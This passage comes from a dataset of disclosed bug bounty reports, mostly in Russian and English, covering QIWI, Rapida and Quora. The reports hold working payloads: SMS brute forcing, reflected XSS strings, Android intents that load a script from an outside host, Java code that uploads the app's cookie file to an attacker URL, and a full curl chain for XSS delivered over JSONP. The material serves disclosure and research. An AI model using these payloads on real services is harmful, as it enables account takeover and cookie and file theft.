Code 595 BytesWrap lines Copy Download1POST /shops/service_pin/ HTTP/1.1
2Host: wallet.rapida.ru
3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate, br
7Referer: https://wallet.rapida.ru/shops/service/
8Cookie: <MANY_COOKIES>
9Connection: close
10Upgrade-Insecure-Requests: 1
11Content-Type: application/x-www-form-urlencoded
12Content-Length: 97
13
14csrfmiddlewaretoken=OeAE6H3RRanCyG5HdSJWiiST5iyvC0rz&7=<MOBILE>&amount=200.00&spin=<INTRUDER_VALUE>&stid=9
5) Заряжаем перебирать spin от сих и до сих. Смотря насколько вы себя не любите, в общем.
6) На каждый такой запрос вам ругнутся, что код не правильный и сразу пошлют новый.
1 попытка интрудера = 1 новый код.
Я поймал 112 смс и поставил тел на беззвучный, так как до сих пор идут.
Fix:
3 попытки ввести код и прекращать функцию регистрации шаблона. Оно того не стоит)",https://hackerone.com/reports/209368,Moscow,Russia,Moscow,2017,2,27,17,48
QIWI,1001-5000,0.0,200m-1b,$250.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,[XSS/3dsecure.qiwi.com] 3DSecure XSS,"nstikhomirov  submitted a report to QIWI.Jan 13th (6 years ago)При отправке POST запроса:
Code 753 BytesWrap lines Copy Download1POST https://3dsecure.qiwi.com/acs/pareq?network=VISA HTTP/1.1
2Host: 3dsecure.qiwi.com
3Connection: keep-alive
4Content-Length: 37
5Cache-Control: max-age=0
6Origin: https://pay.qiwi.com
7Upgrade-Insecure-Requests: 1
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
9Content-Type: application/x-www-form-urlencoded
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
11Referer: https://pay.qiwi.com/?token=7809dc86-f077-4931-a7e7-628c38c16150
12Accept-Encoding: gzip, deflate, br
13Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
14Cookie: JSESSIONID=XRCZ-Xhl9Qsb6oP-TOrUQ-F2jU-p3MsYGz5OGdQjrvX2PFRYUiNE!-242627973
15
16PaReq=test&MD=test%22%3E&TermUrl=test
Сервер возвращает 
Code 599 BytesWrap lines Copy Download1<html>
2
3<head>
4    <script>
5        function onLoadFunction() {
6            document.data.submit();
7        }
8    </script>
9</head>
10
11<body onLoad=""onLoadFunction()"">
12    <form name=""data"" method=""POST"" action=""test"">
13    <input type=""hidden"" name=""MD"" value=""test"">"">
14    <input type=""hidden"" name=""PaRes"" value=""eJxVj0sLwjAQhP/KkruNiqCFbURsqwcF8XHwWM2qgTahSX39e6tNFS8LyzczO4vjR5HDjaxTRkesF3QZkD4aqfQ5Yrtt2hmxscDtxRLFGzpeLQlcknPZmUDJiMVhXsp7lvb2w/lkFg6m6/ViWSYpE5hYa6xAHy7q7KCPvF2R3nhqJIkwRP7bGuBviBXZItOkK3BPV1EBp0zldYvAW1pd44qpqrFI60ESKgOHq8olfBgUjbR1ei1y35N/o/jfuy9UbWWC""></form>
15</body>
16
17</html>
Как мы видим <input type=""hidden"" name=""MD"" value=""test"">""> являет собой пассивную XSS через POST запрос.
Советы по исправлению: Сделать escape "" на &quot; символnstikhomirov   posted a comment. Jan 13th (6 years ago)TermUrl параметр так-же уязвим путем закрытия тэга "">
Возвращается:
<form name=""data"" method=""POST"" action=""test"">"">
(Не забудьте про javascript: IO)vankyver   changed the status to Triaged. Jan 16th (6 years ago)QIWI  rewarded nstikhomirov with a $250 bounty. Jan 16th (6 years ago)kyprizel   joined this report as a participant. Jan 31st (6 years ago)vankyver   closed the report and changed the status to Resolved. Feb 8th (6 years ago)fixednstikhomirov   requested to disclose this report. Feb 8th (6 years ago)vankyver   posted a comment. Feb 9th (6 years ago)Привет!
Это 3rd-party, поэтому ссори, раскрывать не будем.   This report has been disclosed. Mar 10th (6 years ago)",https://hackerone.com/reports/198249,Moscow,Russia,Moscow,2017,1,13,23,5
QIWI,1001-5000,0.0,200m-1b,$150.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,[XSS/pay.qiwi.com] Pay SubDomain Hard-Use XSS,"nstikhomirov  submitted a report to QIWI.Jan 13th (6 years ago)Если сделать запрос 
Code 387 BytesWrap lines Copy Download1POST https://pay.qiwi.com/paypage/initial HTTP/1.1
2Host: pay.qiwi.com
3Content-Length: 219
4Upgrade-Insecure-Requests: 1
5Content-Type: application/x-www-form-urlencoded
6
7opcode=1&merchant_site=99&currency=643&sign=bb5c48ea540035e6b7c03c8184f74f09d26e9286a9b8f34b236b1bf2587e4268&amount=1&success_url=javascript%3Aalert(document.cookie)%3B&decline_url=javascript%3Aalert(document.cookie)%3B
То возвратится:
Code 451 BytesWrap lines Copy Download1HTTP/1.1 302 Found
2Server: nginx
3Date: Fri, 13 Jan 2017 23:08:46 GMT
4Content-Length: 0
5Connection: keep-alive
6Set-Cookie: 7d2861a94f0c8b8b0006ea2db9952d77=3359f97c-4551-4096-8592-97f7eb6d134e;Expires=Tue, 14-Jan-2020 16:36:22 GMT
7Expires: Thu, 01 Jan 1970 00:00:00 GMT
8Location: https://pay.qiwi.com/?token=2193dfca-2045-4288-892d-7c6c2ac13bf7
9Strict-Transport-Security: max-age=31536000
10X-Content-Type-Options: nosniff
11X-XSS-Protection: 1; mode=block
Оплачиваем или отменяем счет https://pay.qiwi.com/?token=2193dfca-2045-4288-892d-7c6c2ac13bf7 после чего нажимаем Вернутся в магазин, что вызывает javascript:alert(document.cookie);
Image F152273: photo_2017-01-14_02-10-59.jpg 28.30 KiBZoom in Zoom out Copy Download
Image F152272: photo_2017-01-14_02-11-05.jpg 41.47 KiBZoom in Zoom out Copy Download2 attachments:F152272: photo_2017-01-14_02-11-05.jpgF152273: photo_2017-01-14_02-10-59.jpgvankyver   changed the status to Triaged. Jan 16th (6 years ago)QIWI  rewarded nstikhomirov with a $150 bounty. Jan 16th (6 years ago)vankyver   posted a comment. Feb 6th (6 years ago)Привет! Пофиксили, просьба проверить.nstikhomirov   posted a comment. Feb 6th (6 years ago)Да, нету уязвимости большеvankyver   closed the report and changed the status to Resolved. Feb 6th (6 years ago)Спасибо!nstikhomirov   requested to disclose this report. May 14th (6 years ago)  This report has been disclosed. Jun 13th (5 years ago)",https://hackerone.com/reports/198251,Moscow,Russia,Moscow,2017,1,13,23,12
QIWI,1001-5000,0.0,200m-1b,$100.00,Medium,5.45,Phishing,account impersonate through broken link,"nowsafe  submitted a report to QIWI.May 22nd (about 1 year ago)hi  team,
hope you are good,
A link in qiwi.com was broken and anyone could create that account which leads to account impersonate
poc:-
Image F1310817: qiwi.png 42.69 KiBZoom in Zoom out Copy Download
Steps To Reproduce
1) Visit https://qiwi.com/sm
2) the link will redirect you to http://unbouncepages.com/savemyphone/ (which is throwing a error ""The requested URL was not found on this server."")
3)  now visit https://unbounce.com/ and create a page with a name of savemyphone
4) When someone visits https://qiwi.com/sm They are redirected to my page
similar report
https://hackerone.com/reports/265696
To solve this issue
put this link http://unbouncepages.com/savemyphone/
or remove the redirection
Please let me know if you have any questions. I am happy to help
Impact
broken link hijacking
Moreover it leads to the loss in the reputation of the company
thanks.1 attachment:F1310817: qiwi.png",https://hackerone.com/reports/1205604,Moscow,Russia,Moscow,2021,5,22,4,1
QIWI,1001-5000,0.0,200m-1b,$300.00,Critical,9.5,Session Fixation,account takeover https://idea.qiwi.com/ ,"circuit  submitted a report to QIWI.Dec 17th (4 years ago)Здравствуйте. Обнаружил account takeover на данном сайте. С воспроизведением придется поднапрячься, но это стоит того. Учитывая то, что на сайте есть админский аккаунт, в теории можно натворить делов.
Скажу сразу, что мне не удалось полностью понять механизм работы данного тейковера и я буду очень сильно дволен, если после фикса вы расскажете из-за чего он все таки существовал.
Как я понял проблема возникает из-за того, что сессии при логине примерно в одно и то-же время
каким-то образом могут дублироваться.
Мой способ воспроизведения, который работает примерно в 70% случаев:

Удаляем куки в своем браузере;
Удаляем куки в браузере друга; 
Заходим на https://idea.qiwi.com/, попутно включая интрудер в бурпе -> мотаем запросы до того момента, пока не увидим этот запрос
Image F391861: request.png 49.34 KiBZoom in Zoom out Copy Download
Просим друга залогиниться на сайте через ВКонтакте и сразу после того, как он залогинился отправляем данный запрос.
Мы вместо своего аккаунта попадаем в аккаунт к ДРУГУ.

Если не работает сразу, чистите куки и повторяйте. Мне было очень сложно понять как именно придти к более-менее рабочему способу воспроизведения.
Impact
Что мы имеем в итоге:

После того, как получилось проэксплуатировать уязвимости кука PHPSESSID в нашем браузере совпадает с кукой PHPSESSID в браузере жертвы;
Мы получаем полный доступ к аккаунту жертвы;
Повторяя данные действия бесконечно (возможно каким-то образом можно сделать программную автоматизацию), мы можем рано или поздно попасть в админский аккаунт;
За время тестирования удалось зайти в несколько аккаунтов и вопспроизвести моим методом сразу с несколькими друзьями:

Image F391881: 1.png 131.44 KiBZoom in Zoom out Copy Download
Image F391883: 2.png 276.65 KiBZoom in Zoom out Copy Download
Image F391885: 3.png 113.02 KiBZoom in Zoom out Copy Download4 attachments:F391861: request.pngF391881: 1.pngF391883: 2.pngF391885: 3.pngcircuit   posted a comment. Dec 17th (4 years ago)Я тестировал вход через ВКонтакте*circuit   posted a comment. Dec 18th (4 years ago)Вообщем немного упростил POC:

Просто одновременно с другом попытайтесь зайти через вк на сайт;
vankyver   changed the status to Triaged. Dec 21st (4 years ago)Привет!
Воспроизвелось, принимаем!QIWI  rewarded circuit with a $300 bounty. Dec 21st (4 years ago)Спасибо за помощь!
Сумма обусловлена низкой критичностью сервиса.circuit   posted a comment. Jun 6th (3 years ago)Добрый день! Скажите, планируется ли фикс по моим тейковерам? По этому и этому? https://hackerone.com/reports/439207 Хочу к следующему Positive Hack Days подготовить доклад. Нужен resolved и дисклоз ;) Времени еще много, но хочу уточнить.gmedian   posted a comment. Jun 7th (3 years ago)Добрый день.
Фиксы планируются, конечно. Портал idea должен вскоре совсем быть убран. Про второй репорт - вскоре обещают фикс. Как только так сразу :)vankyver   closed the report and changed the status to Resolved. Aug 22nd (3 years ago)circuit   requested to disclose this report. Aug 26th (3 years ago)vankyver   agreed to disclose this report. Aug 28th (3 years ago)  This report has been disclosed. Aug 28th (3 years ago)",https://hackerone.com/reports/464426,Moscow,Russia,Moscow,2018,12,17,22,10
QIWI,1001-5000,0.0,200m-1b,$500.00,Critical,9.5,None,account takeover https://teamplay.qiwi.com,circuit  submitted a report to QIWI.Nov 11th (4 years ago),https://hackerone.com/reports/439207,Moscow,Russia,Moscow,2018,11,11,21,56
QIWI,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Violation of Secure Design Principles,Session Cookie without HttpOnly and secure flag set,"pradeepch99  submitted a report to QIWI.Jul 14th (7 years ago)vulnerable URL:https://portal.int.qiwi.com/login.php
The PHPSESSID cookie does not have the HTTPOnly flag set.
When a cookie is set with the HTTPOnly flag, it instructs the browser that the cookie can only accessed by the server and not by client-side scripts.
This is an important security protection for session cookies.1 attachment:F44850: qiwi1.JPGvankyver   changed the status to Triaged. Jul 16th (7 years ago)
    
    
        
            
                
                
                
            
        
    
pradeepch99   posted a comment. Jul 21st (7 years ago)any update?
    
    
        
            
                
                
                
            
        
    
pradeepch99   posted a comment. Jul 31st (7 years ago)Hi there, any update?vankyver   posted a comment. Aug 3rd (7 years ago)Hi, unfortunately still waiting for fix.QIWI  rewarded pradeepch99 with a $100 bounty. Aug 28th (7 years ago)videns   closed the report and changed the status to Resolved. Aug 28th (7 years ago)pradeepch99   requested to disclose this report. Aug 28th (7 years ago)  This report has been disclosed. Sep 27th (7 years ago)",https://hackerone.com/reports/75357,Moscow,Russia,Moscow,2015,7,14,10,5
Quora,501-1000,0.0,10m-50m,$150.00,Low,2.0,Cross-site Scripting (XSS) - Generic,[Android] XSS via start ContentActivity,"bobrov  submitted a report to Quora.Dec 9th (6 years ago)Summary:
XSS via start ContentActivity using 'html' parameter.
Description (Include Impact):
Arbitrary applications on Android can run the exported activities ContentActivity, ModalContentActivity and ActionBarContentActivity. Using intent extra parameter html we can pass javascript, which will be executed in the context of www.quora.com.
Impact: 

typical XSS on www.quora.com
access to QuoraAndroid JSBridge (for example, ClipboardData )
RCE on old Android <= 4.2 (see references)

Steps To Reproduce
Using ADB
alert(123)
Code 149 BytesWrap lines Copy Download1adb shell
2am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
Run script from external host
Code 421 BytesWrap lines Copy Download1am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
2am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
3am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
Access to ClipboardData
Code 161 BytesWrap lines Copy Download1am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
Using another app
Code 239 BytesWrap lines Copy Download1Intent i = new Intent();
2i.setComponent(new ComponentName(""com.quora.android"",""com.quora.android.ActionBarContentActivity""));
3i.putExtra(""url"",""http://test/test"");
4i.putExtra(""html"",""XSS PoC <script>alert(123)</script>"");
5startActivity(i);
Your Environment (Browser version, Device, app version, os version etc)

Nexus 5, Android 6.0.1

Supporting Material/References (Screenshots)

https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/

XSS
Image F142023: Screenshot_20161209-150324.png 47.61 KiBZoom in Zoom out Copy Download
Access to ClipboardData
Image F142024: Screenshot_20161209-145102.png 127.04 KiBZoom in Zoom out Copy Download2 attachments:F142023: Screenshot_20161209-150324.pngF142024: Screenshot_20161209-145102.png",https://hackerone.com/reports/189793,California,United States,Mountain View,2016,12,9,11,15
Quora,501-1000,0.0,10m-50m,$300.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,[controlsyou.quora.com] 429 Too Many Requests Error-Page XSS,"bobrov  submitted a report to Quora.Dec 9th (6 years ago)Summary:
XSS on the error page when the user makes too many requests.
Steps To Reproduce

Make a lot of requests to get the error 429
Open PoC in FireFox

Code 56 BytesWrap lines Copy Download1https://controlsyou.quora.com/'-alert(document.domain)-'
HTTP Response
Code 179 BytesWrap lines Copy Download1<script type=""text/javascript"">
2...
3ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
4ga('set', 'dimension2', 'False');
5ga('set', 'dimension3', 'False');});});</script>
Optional: Your Environment (Browser version, Device, app version, os version etc)
Tested on FireFox 50.0.2",https://hackerone.com/reports/189768,California,United States,Mountain View,2016,12,9,9,3
Quora,501-1000,0.0,10m-50m,$300.00,Medium,5.45,Information Disclosure,[Quora Android] Possible to steal arbitrary files from mobile device,"bagipro  submitted a report to Quora.Aug 9th (5 years ago)Summary:
Service
Code 110 BytesWrap lines Copy Download1<service android:enabled=""true"" android:exported=""true"" android:name=""net.gotev.uploadservice.UploadService""/>
enabled and exported. If it's exported, it means that any third party application can access it and send arbitrary data into it.
The following code sends main database file to arbitrary server (I used http://google.com/zaheck):
Code 909 BytesWrap lines Copy Download1        UploadTaskParameters params = new UploadTaskParameters();
2        params.setId(""1337"");
3        params.setServerUrl(""http://google.com/zaheck"");
4        try {
5            params.addFile(new UploadFile(""/data/data/com.quora.android/app_webview/Cookies""));
6
7        }
8        catch(FileNotFoundException e) {
9            throw new IllegalStateException(e); /* should be never thrown because not checked on the client side */
10        }
11
12        Intent intent = new Intent(""net.gotev.uploadservice.action.upload"");
13        intent.setClassName(""com.quora.android"", ""net.gotev.uploadservice.UploadService"");
14        intent.putExtra(""taskClass"", ""net.gotev.uploadservice.MultipartUploadTask"");
15        intent.putExtra(""multipartUtf8Charset"", true);
16        intent.putExtra(""httpTaskParameters"", new HttpUploadTaskParameters());
17        intent.putExtra(""taskParameters"", params);
18        startService(intent);
In the result protected file /data/data/com.quora.android/app_webview/Cookies which is not accessible to any application besides yours is sent to the attacker. It's really serious vulnerability which allows to takeover accounts. It can be used by any third party installed application on the same device. On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).
Description (Include Impact):
I believe it's not your vulnerability, but the gotev's library you use. Anyway, attacker can steal files with settings, cookies (even httpOnly, it doesn't matter), google authorization token is stored in shared_prefs file, which also can be stolen
PoC:
Image F211064: 2017-08-10_01-13-31.jpg 532.57 KiBZoom in Zoom out Copy Download
This file contain sensitive cookies
Image F211066: 2017-08-10_01-21-39.jpg 357.97 KiBZoom in Zoom out Copy Download
Steps To Reproduce
 I attached an apk file which sends /data/data/com.quora.android/app_webview/Cookies to http://google.com/zaheck
Install apk and open it, file with all cookies will be sent automatically to attacker provided URL3 attachments:F211064: 2017-08-10_01-13-31.jpgF211066: 2017-08-10_01-21-39.jpgF211067: app-release.apk Bot:  changed the status to Needs more info. Aug 9th (5 years ago)Automated vulnerability scanners commonly have low priority issues and/or false positives. Before submitting the results from a scanner, please take a moment to confirm that the reported issues are actually valid and exploitable. In this specific case, many cookies intentionally lack the HttpOnly flag so that they can be accessed from JavaScript. This only introduces a potential risk if the cookie in question contains session data or other sensitive information.bagipro   changed the status to New. Aug 9th (5 years ago)Please advise me how can I upload a video inside your Android app. Because I see another high-impact bug in your app related to videosbagipro   posted a comment. Aug 11th (5 years ago)I contacted with the developer and he told that he will update his library very soon (today/tomorrow)sriram-quora   changed the status to Triaged. Aug 11th (5 years ago)Thanks for the report. We are applying a fix for this issue too.
Unfortunately we cannot add you to the beta at the moment. Can you report the video issue as a seperate bug even if you are unable to fully validate it?bagipro   posted a comment. Aug 16th (5 years ago)Hi. Please update to the latest version https://github.com/gotev/android-upload-service/releases/tag/3.4, released 4 minutes agosriram-quora   updated the severity from critical to medium. Aug 16th (5 years ago)Quora  rewarded bagipro with a $300 bounty and a $200 bonus. Aug 16th (5 years ago)Thanks for the detailed report. I have added a bonus for the through writeup. This should be fixed with our next release.bagipro   posted a comment. Aug 26th (5 years ago)May we disclose this one when the fix is applied?sriram-quora   closed the report and changed the status to Resolved. Aug 30th (5 years ago)sriram-quora   requested to disclose this report. Aug 30th (5 years ago)bagipro   agreed to disclose this report. Aug 30th (5 years ago)  This report has been disclosed. Aug 30th (5 years ago)Summary by bagipro
On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).

It actually was a mistake, services can be accessed by Instant Apps only in case when https://developer.android.com/reference/android/R.attr.html#visibleToInstantApps flag is enabled",https://hackerone.com/reports/258460,California,United States,Mountain View,2017,8,9,22,24
Quora,501-1000,0.0,10m-50m,$600.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,XSS through `__e2e_action_id` delivered by JSONP,"0xnan  submitted a report to Quora.Aug 11th (5 years ago)Summary:
The __e2e_action_id params used with POST requests to /server_call_POST?_m=* endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.
Also, another issue on some methods (such as /server_call_POST?_m=edit) allows - with a strong premise discussed on the description - any authenticated user to deliver the vulnerability to another user without any interaction.
Description
XXS
On the Web Application http://www.quora.com most user actions are performed as POST on /server_call_POST?_m=*, implementing AJAX architecture.
On the client side these requests are processed by  ./shared/core/rpc.js library that in turns uses the library ./actions.js to define ""actions"" which have an ID __e2e_action_id and some methods such as startAction() and finishAction(id, ...).
The __e2e_eaction_id is generated for every request with id = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36) so its value is intended to be composed by [0-9a-z].
When a user performs an action, this ID is embedded on the POST request and with some methods (for
example /server_call_POST?_m=load_menu) its content is reflected back as first argument of
finishAction().  For example a ""normal"" call, with __e2e_action_id=esko02tjqe is the following (I've omitted most headers/params/data):
Code 721 BytesWrap lines Copy Download1curl 'https://www.quora.com/webnode2/server_call_POST?_v=####&_m=load_menu'  
2-data 'json=...&__e2e_action_id=esko02tjqe&...'
3
4> POST /webnode2/server_call_POST?_v=█████&_m=load_menu HTTP/1.1
5> Host: www.quora.com
6> Cookie: █████████████████████
7...
8< HTTP/1.1 200 OK
9< Content-Type: application/json; charset=utf-8
10< Server: nginx
11< 
12{""value"": {
13     ""html"": ..., 
14      ""css"": .......,                             (↓↓↓↓↓↓ reflected ID)
15       ""js"": ""require('actions').finishAction('esko02tjqe', {\""controller\"": \""webnode2\"", \""action\"": \""server_call_POST\"", \""standard\"": {}, \""serverTime\"": 34511, \""mustReport\"": true});\n            var webnode = require('shared/core/webnode');\n   ....     ""}, 
16   ""pmsg"": null}
Since no escaping is performed, it is possible to inject code, for example setting __e2e_action_id=',alert(),' which will produce:
Code 78 BytesWrap lines Copy Download1...
2 ""js"": ""require('actions').finishAction('',alert(),'', {\""cont... ""}, 
3...
creating a valid js section that execute alert().
Fortunately this vulnerability can't be triggered as it is because this would require the malformed request to be sent by Quora.com since it is ./shared/core/rpc.js that execute the response (that has a content type of application/json) and seems that there is no way to directly set the __e2e_action_id on a session of Quora (a new one is generated  for each action).
Deliver the XSS using JSONP
I've noticed another ""vulnerability"" that can be chained with the aforementioned to be able to effectively
deliver the XSS to an user.
When an user is on Quora, to its page is associated a ""channel"" (I hope this is the correct name) such as main-w-dep3105-32490323.... and there is always a request that try to fetch new ""update"" from a
channel (restarted each time it returns).
This request is update on *.tch.quora.com, for example:
Code 272 BytesWrap lines Copy Download1REQUEST
2https://tch969298.tch.quora.com/up/chan43-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3105-32490323....&hash=16762940...
3
4POSSIBLE RESPONSE:
5jsonp<callback_name>({""messages"":[""require.whenReady(\""main\"", function() {\n ... ,""min_seq"":1591113381})
The action /server_call_POST?_m=edit (used for example when an user change its profile description), do not behave like /server_call_POST?_m=load_menu (described in the first section). What I mean is that they do not reply with the response {""value"": {""html"": ..., ""css"": ...., ""js"": ...}, ""pmsg"": """"} to update the page but they reply with a response {""value"": null, ""pmsg"": null} and deliver the update through a message on the channel of the user.
For example after a /server_call_POST?_m=edit with __e2e_action_id=eskrisktsq the /update? request reply with:
Code 266 BytesWrap lines Copy Download1jsonp<callback_name>({""messages"":[""require.whenReady(\""main\"", function()
2 {require('actions').finishAction('eskrisktsq' ... <other data of the edit action>
3                                     ↑↑↑↑↑
4             (__e2e_action_id of the _m=edit call reflected)
5     
on which eskrisktsq is the __e2e_action_id used on the _m=edit call vulnerable to XSS.
The fact that _m=edit sent a message to the channel main-w-dep3105-32490323.... it's because this channel is specified as parameter on the request _m=edit:
Code 398 BytesWrap lines Copy Download1curl 'https://www.quora.com/webnode2/server_call_POST?_v=███████&_m=edit' 
2--data 'json={
3""args"":[],""kwargs"":{the data of the edit}}&
4revision=███████████&
5formkey=███████████&
6postkey=███████████&
7window_id=dep3105-32490323....&                          ← specified here
8_lm_window_id=dep3105-32490323....&                      ←   and here
9__e2e_action_id=eskrisktsq&
10&__vcon_json=[█████]&.....' 
The real problem is that this method do not check if the specified channel is associated to user session who performed the call. So what could happen is that the attacker can send the XSS to
a specified channel name that will be triggered as soon as the update? request (of the victim user) receives the evil data, without any interaction of the victim.
The effect of _m=edit (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but the finishAction() message (vulnerable to XSS) is sent to the victim channel name.
I can confirm that this behavior is not present on other methods: for example with _m=load_menu if you try to change the window_id you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as _m=edit.
I've not tested other methods, anyway I think that all the methods that reply with {""value"": null, ""pmsg"": null} are vulnerable but not the ones that reply with the update directly (as _m=load_menu does) .
The strong premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.
Anyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:

There could be easy ways that I did not find to leak valid channel_name
The attack can't be stopped from browser XSS filters
The XSS seems to work only on Quora.com (Android do not use __e2e_action_id, IOs not tested)
A channel_name is composed of dep<4 digit[0-9]>-<up to 19 digit[0-9]>. Valid 4 digits for dep
can be leaked using https://www.quora.com/check_livedeps/index?window_id=dep3304-
that seems to respond with ""ok"" if the 4 digits (in this case 3304) are part of a channel alive.
the remaining part is infeasible to enumerate (10^19), but should be noted that:


doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker's Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.
if the XSS is sent to a channel_name that is not used by any user and Quora assigns this
channel_name, up to 5minutes later the evil request was sent, the XSS is delivered correctly.
(BTW I do not know if Quora would assign a channel name on which a message is already ""pending"")
-I think the attacker can keep busy some channels name (reducing the space to enumerate),
logging and executing the same code that Quora uses to attach a channel to an user, e.g:   

Code 267 BytesWrap lines Copy Download1 require(""tchannel_up"").start(0, ""main-w-dep3104-34040..."", ""2287...."", ""chan42-8888"", ""quora.com"", """");
2
3or simply a repeated GET on:
4
5https://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3104-34040...&hash=2287....
since seems that there isn't a limit on how much ""active"" channel are reserved for a user session (I've not tried extensively, but i've executed 3 time the code with channel saved from past session - since you need the hash params - and works).
Steps To Reproduce
I describe the steps using browser Chromium, but it is not stricly necessary


Attacker log in on Quora.com and goes on its profile page 


Attacker open developer tools of its browser and goes on the ""Network"" tab


Attacker update its profile description using dummy data and copy the request performed on server_call_POST?_m=edit, eg:
curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&_m=edit' -H 'Cookie: m-b=""██████████████████""; m-sa=1; m-s=""███████████████""; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/Aleph-NaN' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={""args"":[],""kwargs"":{""id"":███████████,""input"":{""sections"":[{""type"":""plain"",""indent"":0,""quoted"":false,""spans"":[{""modifiers"":{},""text"":""a""}]}],""caret"":{""start"":{""spanIdx"":0,""sectionIdx"":0,""offset"":1},""end"":{""spanIdx"":0,""sectionIdx"":0,""offset"":1}}}}}&revision=904d048187b642341464067b64246119b8ce9489&formkey=6a34c75ed7fda8439ca2407b4520c974&postkey=736f2eea9e3826808823625bf4ede215&window_id=dep3204-1727465467565139446&referring_controller=user&referring_action=profile&_lm_transaction_id=0.7159021828610441&_lm_window_id=dep3204-1727465467565139446&__vcon_json=[""2rtUq6Z4HO9gWK""]&__vcon_method=edit&__e2e_action_id=esl2xq4xyj&js_init={""id"":████████████,""input"":""user_description_text"",""typing_area"":null,""draft_space"":null,""unsaved_content_msg"":""Your content has not been saved."",""focus_onload"":false,""is_qtext"":true,""require_comment"":false,""require_value"":false,""content_type"":null,""submit_text"":""Update"",""show_editor"":false}&__metadata={}' --compressed 


the attacker obtain the victim channel name, eg: dep3501-3261853912009855464


the attacker modify its previusly copied request, setting the window_id and _lm_window_id parameters to the victim channel name


the attacker modify the request, setting the __e2e_action_id parameter to inject its javascript payload, for example to ',alert(1),', eg:
curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&_m=edit' -H 'Cookie: m-b=""██████████████""; m-sa=1; m-s=""█████████████████""; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/████' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={""args"":[],""kwargs"":{""id"":█████████,""input"":{""sections"":[{""type"":""plain"",""indent"":0,""quoted"":false,""spans"":[{""modifiers"":{},""text"":""a""}]}],""caret"":{""start"":{""spanIdx"":0,""sectionIdx"":0,""offset"":1},""end"":{""spanIdx"":0,""sectionIdx"":0,""offset"":1}}}}}&revision=904d048187b642341464067b64246119b8ce9489&formkey=6a34c75ed7fda8439ca2407b4520c974&postkey=736f2eea9e3826808823625bf4ede215&window_id=dep3501-3261853912009855464&referring_controller=user&referring_action=profile&_lm_transaction_id=0.7159021828610441&_lm_window_id=dep3501-3261853912009855464&__vcon_json=[""2rtUq6Z4HO9gWK""]&__vcon_method=edit&__e2e_action_id=\',alert(1),\'&js_init={""id"":████████,""input"":""user_description_text"",""typing_area"":null,""draft_space"":null,""unsaved_content_msg"":""Your content has not been 